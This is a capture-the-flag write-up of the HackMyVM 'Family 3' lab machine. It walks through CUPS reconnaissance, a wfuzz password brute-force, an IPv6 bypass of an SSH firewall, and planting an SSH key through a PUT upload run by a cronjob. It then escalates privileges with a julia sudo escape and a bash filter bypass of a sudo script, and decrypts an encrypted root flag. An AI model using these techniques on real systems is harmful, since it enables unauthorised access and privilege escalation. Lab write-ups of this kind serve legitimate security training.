# Family 3

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.201:22
Open 10.0.2.201:631
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.201
PORT    STATE    SERVICE REASON      VERSION
22/tcp  filtered ssh     no-response
631/tcp open     ipp     syn-ack     CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Home - CUPS 2.3.3op2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
```
:::

## CUPS

```bash
â””â”€$ nmap -sV -p631 --script=cups* 10.0.2.201
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.3
| cups-info:
|   _mum_printer
|     DNS-SD Name: _mum_printer @ family
|     Location: bedroom
|     Model: Generic Text-Only Printer
|     State: Idle
|_    Queue: 0 print jobs
|_http-server-header: CUPS/2.3 IPP/2.1
MAC Address: 08:00:27:36:29:10 (Oracle VirtualBox virtual NIC)
```

- [evil-cups](https://github.com/IppSec/evil-cups) failed to get RCE, but printer was successfully added

Bruteforce password, since printer belongs to mum that must be username
```bash
â””â”€$ wfuzz -u http://10.0.2.201:631/admin -c -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt --basic 'mum:FUZZ' -b "org.cups.sid=cfb873c9bee05c530585ed89a9802dc0" -d "org.cups.sid=cfb873c9bee05c530585ed89a9802dc0&OP=add-printer" --hc 401
000000014:   200        110 L    296 W      3439 Ch     "lovely"
```

## SSH

We can login into CUPS, but not much from there

SSH has a firewall rule, but we can try IPv6 bypass
```bash
â””â”€$ ping6 -I tun0 -c 2 ff02::1
â””â”€$ arp -a
? (10.0.2.201) at 08:00:27:36:29:10 [ether] on eth0
...
```

```bash
â””â”€$ sshpass -p 'lovely' ssh mum@fe80::a00:27ff:fe36:2910%eth0 -t bash
mum@family:~$ id
uid=1002(mum) gid=1002(mum) groups=1002(mum),7(lp),117(lpadmin)
```

## Privilege Escalation (dad)

Lol

![writeup.png](/assets/pentest/hackmyvm/family3/writeup.png)

```bash
mum@family:~$ find /home -type f -ls 2>/dev/null | grep -v bash
   130594      4 -rw-r--r--   1 dad      dad           807 Oct  2  2022 /home/dad/.profile
   130719      4 -rw-r-----   1 dad      dad           445 Oct 17  2022 /home/dad/survey/server.py
   133203      8 -rw-r--r--   1 dad      dad          7031 Oct 17  2022 /home/dad/survey/index.html
   132784      4 -rwxr-xr-x   1 dad      dad           620 Oct 25  2022 /home/dad/project
   132992      4 -rw-r--r--   1 baby     baby          807 Oct 11  2022 /home/baby/.profile
       34      4 -rwxr-xr-x   1 root     root          383 Oct 23  2022 /home/baby/chocapic
   130699      4 -rwx------   1 baby     baby           35 Oct 18  2022 /home/baby/user.txt
```

```bash
um@family:~$ ps aux | grep server
dad          448  0.0  0.0   2484   572 ?        Ss   17:37   0:00 /bin/sh -c cd ~/survey && /usr/bin/python2.7 server.py
dad          455  0.2  0.3  18132 12980 ?        S    17:37   0:11 /usr/bin/python2.7 server.py
```

```bash
mum@family:/home/dad$ cat project
#! /bin/bash

find / -user mum -writable -exec rm {} \; 2>/dev/null
find / -user mum -type f -name -exec grep -il 'password' {} \; 2>/dev/null
find / -user mum -type f -name "id_rsa" 2>/dev/null
find / -user mum -type f -name "authorized_keys" 2>/dev/null
find / -mmin -30 -user mum 2>/dev/null | grep -v "/proc/*"
find /home/dad -type f ! -name "project" -user dad -executable -exec mv "{}" ~/survey \;
cat /var/mail/mum
cat /home/mum/.bash_history 2>/dev/null
cat /var/spool/cups/d0002*
for file in ~/survey/* ; do [[ -O $file ]] && bash $file 2>/dev/null ; done
strings /dev/mem -n100 | grep -i mum
who -u |grep mum
```

```bash
mum@family:/home/dad/survey$ ls -alh
total 20K
drwxr-xr-x 2 dad dad 4.0K Oct 23  2022 .
drwxr-xr-x 5 dad dad 4.0K Oct 25  2022 ..
-rw-r--r-- 1 dad dad 6.9K Oct 17  2022 index.html
-rw-r----- 1 dad dad  445 Oct 17  2022 server.py
```

After fuzzing some I noticed that `PUT` method was the only method that returned nothing, GET returned `index.html` and other methods just errors.
```bash
mum@family:/home/dad/survey$ curl 0:8000/ -X PUT -d ''
curl: (52) Empty reply from server
mum@family:/home/dad/survey$ curl 0:8000/ -X PUT -d 'x=1'
curl: (52) Empty reply from server
mum@family:/home/dad/survey$ curl 0:8000/ -X PUT -d 'file=x'
curl: (52) Empty reply from server
mum@family:/home/dad/survey$ curl 0:8000/ -X PUT -d 'hello'
curl: (52) Empty reply from server
mum@family:/home/dad/survey$ curl 0:8000/hi -X PUT -d 'hello'
curl: (52) Empty reply from server
mum@family:/home/dad/survey$ ls -lah
total 24K
drwxr-xr-x 2 dad dad 4.0K Feb 12 19:04 .
drwxr-xr-x 5 dad dad 4.0K Oct 25  2022 ..
-rw-r--r-- 1 dad dad    5 Feb 12 19:04 hi
-rw-r--r-- 1 dad dad 6.9K Oct 17  2022 index.html
-rw-r----- 1 dad dad  445 Oct 17  2022 server.py
```

Looks like file upload is possible with `PUT` + `Path` + `Data`

The `project` looks like a cronjob and it executes anything in `survey`

```bash
â””â”€$ gen_ssh_deploy id_rsa dad
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/dad/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0nXciPuYBJh1PIXFikdILnk/lD62HeBHekHyORFyWb woyag@kraken' >> /home/dad/.ssh/authorized_keys ; chmod 700 /home/dad/.ssh ; chmod 600 /home/dad/.ssh/authorized_keys
```

```bash
mum@family:/home/dad/survey$ curl 0:8000/letmein -X PUT -d "SSH_DEPLOY_CMD"
```

Wait minute or two
```bash
â””â”€$ ssh -i id_rsa dad@fe80::a00:27ff:fe36:2910%eth0 -t bash
dad@family:~$ id
uid=1000(dad) gid=1000(dad) groups=1000(dad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

## Privilege Escalation (baby)

```bash
dad@family:~$ sudo -l
Matching Defaults entries for dad on family:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dad may run the following commands on family:
    (baby) NOPASSWD: /usr/bin/julia
```

- [https://gtfobins.org/gtfobins/julia/](https://gtfobins.org/gtfobins/julia/)

```bash
dad@family:~$ sudo -u baby julia -e 'run(`/bin/bash`)'
bðŸ‘¶by@family:/home/dad$ id
uid=1001(baby) gid=1001(baby) groups=1001(baby)
```

### User.txt

```bash
bðŸ‘¶by@family:~$ cat user.txt
4fd7881d10d000c69c6f3bca0c8f7ad5
```

## Privilege Escalation (root)

```bash
bðŸ‘¶by@family:~$ sudo -l
Matching Defaults entries for baby on family:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User baby may run the following commands on family:
    (root) NOPASSWD: /home/baby/chocapic
```

```bash
bðŸ‘¶by@family:~$ cat chocapic
#!/bin/bash
set -e  # exit on any error

while :
do
    read -ep "baby command: " cmd
    # Reject input if it starts with alphanumeric or is empty
    # Only allows commands starting with special chars like / . - etc
    [[ ! $cmd =~ ^[[:alnum:]]|^$ ]] && break
done

# Take the first "word" of the command (everything before first space)
# Then check its length is exactly 1 character
var=$(echo ${cmd%% *}) 2>/dev/null
[[ ${#var} -ne 1 ]] && exit 1

# Split command into array, grab the second word
read -ra line <<< "$cmd"
check=${line[1]}

# Second word must NOT start with lowercase a-z
[[ $check =~ ^[a-z] ]] && exit 1

# Second word must be a bash builtin OR exactly 1 character long
if ! type -t "$check" | grep ^b >/dev/null && [[ ! ${#check} -eq 1 ]]; then exit 1; fi

# Run the second word as eval, then run the full command
eval "$check" 2>/dev/null
bash -c "$cmd"
```

After some bash fuckery this worked
```bash
bðŸ‘¶by@family:~$ echo '. : ;id' | sudo /home/baby/chocapic
bash: line 1: :: No such file or directory
uid=0(root) gid=0(root) groups=0(root)
```

```bash
bðŸ‘¶by@family:~$ (echo '. : ;bash'; cat) | sudo /home/baby/chocapic
> id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

It's not ascii?
```bash
> xxd /root/root.txt
00000000: 5361 6c74 6564 5f5f 22b3 31d5 ac8b 5408  Salted__".1...T.
00000010: fa95 c888 966d c214 173a 5069 f87c 1871  .....m...:Pi.|.q
00000020: f638 4648 f579 4e55 3a6b 822e e19b a587  .8FH.yNU:k......
00000030: 3234 e67d eeab fc3b 45cb 2401 2f1d 0137  24.}...;E.$./..7
```

:sigh:
```bash
root@family:~# file root.txt
root.txt: openssl enc'd data with salted password
```

There are more then 1 disks
```bash
root@family:~# lsblk -fba
NAME   FSTYPE FSVER LABEL  UUID                                     FSAVAIL FSUSE% MOUNTPOINT
sda
â”œâ”€sda1 ext4   1.0          43aae689-59c2-49fd-b0d3-6f635609eb24 10838884352    17% /
â”œâ”€sda2
â”œâ”€sda3 ext4   1.0   secret 30a31c8b-4878-4519-bed5-5cff52548d9b
â””â”€sda5 swap   1            daf3fdb7-1169-4774-b5e3-f22a5f43897b                    [SWAP]
```

```bash
root@family:~# mount /dev/sda3 /mnt
root@family:~# ls /mnt/ -alh
total 12K
drwxr-xr-x  2 root root 4.0K Oct 15  2022 .
drwxr-xr-x 18 root root 4.0K Oct 19  2022 ..
-rwx------  1 root root   41 Oct 15  2022 password
root@family:~# cat /mnt/password
QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma
root@family:~# umount /mnt
```

Try `AES 256 CBC` decrypt
```bash
root@family:~# openssl enc -d -aes-256-cbc -in root.txt -k "QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma"  ;echo
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
bad decrypt
139867987842368:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:610:
(zqï¿½Z\ï¿½ï¿½ï¿½Eï¿½ï¿½Hp2ï¿½ï¿½Jï¿½Wï¿½
```

Try with suggested flag
```bash
root@family:~# openssl enc -d -aes-256-cbc -in root.txt -k "QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma" -pbkdf2 ;echo
Gï¿½ï¿½ï¿½.ï¿½
      ï¿½ï¿½`ï¿½Í™ï¿½ï¿½ï¿½"ï¿½"
bad decrypt
140555898352960:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:610:
-cï¿½ï¿½ï¿½=
```

Maybe `AES 128`?
```
root@family:~# openssl enc -d -aes-128-cbc -in root.txt -k "QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma" -pbkdf2 ;echo
8d8ff4976efccbfc8ff7d7554b9239e5
```